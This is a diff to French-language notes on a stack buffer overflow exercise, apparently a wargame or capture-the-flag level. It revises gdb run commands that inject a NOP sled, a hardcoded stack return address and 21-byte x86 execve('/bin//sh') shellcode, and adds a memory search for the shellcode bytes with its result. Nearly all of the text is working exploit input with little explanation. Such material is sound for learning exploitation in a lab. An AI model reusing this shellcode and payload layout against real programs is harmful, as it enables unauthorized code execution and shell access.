@@ -96,7 +96,7 @@ not found car %esp est mov dans %ebp donc le find ne trouve pas a partir de %esp
 On a notre adresse a modifier et sa position dans la stack ! MAGNIFIKE MA CHERIE
 
 
-r < <(python -c 'print "A"*40'; python -c 'print "\x90" * 9 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x4c\xf6\xff\xbf"')
+r < <(python -c 'print "\x90"*20'; python -c 'print "\x90" * 9 +  "\x26\xf6\xff\xbf" + 16*"\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
 
 
 ```c
@@ -158,3 +158,9 @@ r < <(python -c 'print "A"*20'; python -c 'print "B"*20')
 0xbffff715
 0xbffff716
 17 patterns found.
+
+find 0xbffdf000, +21000, 0x6a, 0x0b, 0x58, 0x99
+
+0xbffff62a
+
+r < <(python -c 'print "\x90"*20'; python -c 'print "\x90" * 9 +  "\x2a\xf6\xff\xbf" + 4*"\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
